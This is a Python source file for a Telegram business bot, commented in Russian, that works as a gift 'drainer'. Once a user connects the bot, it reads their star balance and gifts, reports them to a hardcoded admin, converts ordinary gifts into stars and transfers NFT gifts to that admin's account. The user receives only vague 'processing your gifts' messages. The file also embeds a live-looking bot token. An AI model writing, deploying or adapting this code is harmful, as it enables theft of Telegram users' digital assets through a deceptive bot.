import os
import json
import logging
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.exceptions import TelegramBadRequest
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# Правильные импорты для aiogram 3.x
from aiogram.types import BotCommand
import aiohttp

# Конфигурация (прямо в коде)
BOT_TOKEN = "8455279912:AAFoWu_2-qxq-BoJUjzwXV1tcRcBnBptkhs"  # Замени на свой токен
ADMIN_ID = 8717189451  # Замени на свой ID
CONNECTIONS_FILE = "connections.json"
GIFTS_CACHE_FILE = "gifts_cache.json"

# Инициализация бота
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Кастомные методы для работы с бизнес API
class GetBusinessAccountStarBalance:
    def __init__(self, business_connection_id: str):
        self.business_connection_id = business_connection_id
        self.__api_method__ = "getBusinessAccountStarBalance"

class GetBusinessAccountGifts:
    def __init__(self, business_connection_id: str):
        self.business_connection_id = business_connection_id
        self.__api_method__ = "getBusinessAccountGifts"

class TransferGift:
    def __init__(self, business_connection_id: str, gift_id: str, receiver_user_id: int):
        self.business_connection_id = business_connection_id
        self.gift_id = gift_id
        self.receiver_user_id = receiver_user_id
        self.__api_method__ = "transferGift"

class ConvertGiftToStars:
    def __init__(self, business_connection_id: str, gift_id: str):
        self.business_connection_id = business_connection_id
        self.gift_id = gift_id
        self.__api_method__ = "convertGiftToStars"

def load_connections():
    """Загрузка бизнес-подключений"""
    if not os.path.exists(CONNECTIONS_FILE):
        return []
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return []

def save_connections(connections):
    """Сохранение бизнес-подключений"""
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(connections, f, indent=2, ensure_ascii=False)

def load_gifts_cache():
    """Загрузка кэша гифтов"""
    if not os.path.exists(GIFTS_CACHE_FILE):
        return {}
    try:
        with open(GIFTS_CACHE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {}

def save_gifts_cache(cache):
    """Сохранение кэша гифтов"""
    with open(GIFTS_CACHE_FILE, "w", encoding="utf-8") as f:
        json.dump(cache, f, indent=2, ensure_ascii=False)

async def get_business_gifts(business_connection_id):
    """Получение списка гифтов бизнес-аккаунта"""
    try:
        result = await bot(GetBusinessAccountGifts(business_connection_id))
        return result.get("gifts", []) if result else []
    except Exception as e:
        logging.error(f"Ошибка получения гифтов: {e}")
        return []

async def get_business_stars(business_connection_id):
    """Получение баланса звезд"""
    try:
        result = await bot(GetBusinessAccountStarBalance(business_connection_id))
        return result.get("star_amount", 0) if result else 0
    except Exception as e:
        logging.error(f"Ошибка получения звезд: {e}")
        return 0

def format_gift_info(gift):
    """Форматирование информации о гифте"""
    is_nft = gift.get("is_nft", False)
    gift_type = "🟣 NFT" if is_nft else "⭐️ Обычный"
    
    info = f"{gift_type} | {gift.get('title', 'Без названия')}\n"
    info += f"   ID: <code>{gift.get('id', 'N/A')}</code>\n"
    
    if gift.get("star_cost"):
        info += f"   💫 Стоимость: {gift.get('star_cost')} звезд\n"
    
    if gift.get("count"):
        info += f"   📦 Количество: {gift.get('count')}\n"
    
    return info

async def send_admin_report(connection_id, user_id, stars_balance, gifts):
    """Отправка подробного отчета админу"""
    try:
        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
        
        report = f"🔔 <b>Новое бизнес-подключение!</b>\n\n"
        report += f"👤 <b>Пользователь:</b> <code>{user_id}</code>\n"
        report += f"🔗 <b>Connection ID:</b> <code>{connection_id}</code>\n"
        report += f"💫 <b>Баланс звезд:</b> {stars_balance}\n"
        report += f"📦 <b>Всего подарков:</b> {len(gifts)}\n"
        report += f"   • NFT: {len(nft_gifts)}\n"
        report += f"   • Обычных: {len(normal_gifts)}\n\n"
        
        if nft_gifts:
            report += f"<b>🟣 NFT Подарки:</b>\n"
            for nft in nft_gifts:
                report += format_gift_info(nft)
                report += "\n"
        else:
            report += f"<b>🟣 NFT:</b> нет\n\n"
        
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="💰 Конвертировать всё", callback_data=f"convert_all_{connection_id}"),
                InlineKeyboardButton(text="🎁 Передать NFT", callback_data=f"transfer_nft_{connection_id}")
            ]
        ])
        
        await bot.send_message(
            chat_id=ADMIN_ID,
            text=report,
            reply_markup=keyboard
        )
        
    except Exception as e:
        logging.exception(f"Ошибка отправки отчета админу: {e}")

async def convert_gift_to_stars(business_connection_id, gift_id, user_id):
    """Конвертация обычного подарка в звезды"""
    try:
        await bot(ConvertGiftToStars(
            business_connection_id=business_connection_id,
            gift_id=gift_id
        ))
        logging.info(f"Конвертирован подарок {gift_id} для {user_id}")
        return True
    except Exception as e:
        logging.error(f"Ошибка конвертации подарка {gift_id}: {e}")
        return False

async def transfer_gift(business_connection_id, gift_id, target_user_id, user_id):
    """Передача гифта"""
    try:
        await bot(TransferGift(
            business_connection_id=business_connection_id,
            gift_id=gift_id,
            receiver_user_id=target_user_id
        ))
        logging.info(f"Передан подарок {gift_id} пользователю {target_user_id}")
        return True
    except Exception as e:
        logging.error(f"Ошибка передачи подарка {gift_id}: {e}")
        return False

async def process_gifts(business_connection_id, user_id, stars_balance, gifts):
    """Обработка гифтов"""
    try:
        nft_gifts = [g for g in gifts if g.get("is_nft", False)]
        normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
        
        # Конвертируем обычные подарки
        converted_count = 0
        for gift in normal_gifts:
            if await convert_gift_to_stars(business_connection_id, gift["id"], user_id):
                converted_count += 1
            await asyncio.sleep(0.5)
        
        # Обновляем баланс после конвертации
        await asyncio.sleep(1)
        new_stars_balance = await get_business_stars(business_connection_id)
        
        # Передаем NFT
        transferred_count = 0
        for nft in nft_gifts:
            required_stars = nft.get("star_cost", 25)
            
            if new_stars_balance < required_stars:
                logging.warning(f"Не хватает звезд для NFT {nft['id']}")
                continue
            
            if await transfer_gift(business_connection_id, nft["id"], ADMIN_ID, user_id):
                transferred_count += 1
                new_stars_balance -= required_stars
            await asyncio.sleep(0.5)
        
        logging.info(f"Обработано: конвертировано {converted_count}, передано NFT {transferred_count}")
        return converted_count, transferred_count
        
    except Exception as e:
        logging.exception(f"Ошибка обработки гифтов: {e}")
        return 0, 0

@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection):
    """Обработка нового бизнес-подключения"""
    try:
        user_id = connection.user.id
        connection_id = connection.business_connection_id
        
        logging.info(f"Новое бизнес-подключение от {user_id}")
        
        # Сохраняем подключение
        connections = load_connections()
        connection_data = {
            "business_connection_id": connection_id,
            "user_id": user_id,
            "date": connection.date.isoformat(),
            "status": "active"
        }
        
        updated = False
        for i, conn in enumerate(connections):
            if conn["user_id"] == user_id:
                connections[i] = connection_data
                updated = True
                break
        
        if not updated:
            connections.append(connection_data)
        
        save_connections(connections)
        
        # Получаем данные
        gifts = await get_business_gifts(connection_id)
        stars_balance = await get_business_stars(connection_id)
        
        # Отчет админу
        await send_admin_report(connection_id, user_id, stars_balance, gifts)
        
        # Приветствие пользователю
        await bot.send_message(
            business_connection_id=connection_id,
            chat_id=user_id,
            text="✅ Бот активирован! Начинаю обработку ваших подарков..."
        )
        
        # Обрабатываем гифты
        await process_gifts(connection_id, user_id, stars_balance, gifts)
        
        # Финальное сообщение
        await bot.send_message(
            business_connection_id=connection_id,
            chat_id=user_id,
            text="✅ Все подарки обработаны!"
        )
        
    except Exception as e:
        logging.exception(f"Ошибка в бизнес-подключении: {e}")

@dp.callback_query()
async def handle_callback(callback: CallbackQuery):
    """Обработка кнопок админа"""
    try:
        data = callback.data.split("_")
        action = data[0]
        connection_id = data[2] if len(data) > 2 else None
        
        if action == "convert" and connection_id:
            gifts = await get_business_gifts(connection_id)
            normal_gifts = [g for g in gifts if not g.get("is_nft", False)]
            
            for gift in normal_gifts:
                await convert_gift_to_stars(connection_id, gift["id"], 0)
                await asyncio.sleep(0.5)
            
            await callback.answer(f"Конвертировано {len(normal_gifts)} подарков!")
            
        elif action == "transfer" and connection_id:
            gifts = await get_business_gifts(connection_id)
            nft_gifts = [g for g in gifts if g.get("is_nft", False)]
            stars_balance = await get_business_stars(connection_id)
            
            transferred = 0
            for nft in nft_gifts:
                required_stars = nft.get("star_cost", 25)
                if stars_balance >= required_stars:
                    if await transfer_gift(connection_id, nft["id"], ADMIN_ID, 0):
                        transferred += 1
                        stars_balance -= required_stars
                await asyncio.sleep(0.5)
            
            await callback.answer(f"Передано {transferred} NFT!")
        
        await callback.message.delete()
        
    except Exception as e:
        logging.exception(f"Ошибка в callback: {e}")
        await callback.answer(f"Ошибка: {e}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    """Команда /start"""
    connections = load_connections()
    count = len(connections)
    
    await message.answer(
        f"🤖 <b>Бизнес-бот для сбора подарков</b>\n\n"
        f"📊 Активных подключений: <code>{count}</code>\n\n"
        f"<b>Как это работает:</b>\n"
        f"1️⃣ Подключите меня как бизнес-бота\n"
        f"2️⃣ Я автоматически:\n"
        f"   • Конвертирую обычные подарки в звезды\n"
        f"   • Передаю NFT администратору\n\n"
        f"👤 <b>Администратор:</b> <code>{ADMIN_ID}</code>",
        parse_mode="HTML"
    )

@dp.message(F.text == "/stats")
async def stats_command(message: Message):
    """Статистика для админа"""
    if message.from_user.id != ADMIN_ID:
        await message.reply("❌ Нет доступа.")
        return
    
    connections = load_connections()
    
    stats = f"📊 <b>Статистика бота</b>\n\n"
    stats += f"🔗 Всего подключений: <code>{len(connections)}</code>\n\n"
    stats += f"<b>Последние подключения:</b>\n"
    
    for conn in connections[-10:]:
        stats += f"• <code>{conn['user_id']}</code> - {conn['date'][:10]}\n"
    
    await message.answer(stats, parse_mode="HTML")

# Запуск
if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    logging.info("🤖 Бот запущен")
    
    async def main():
        await dp.start_polling(bot)
    
    asyncio.run(main())
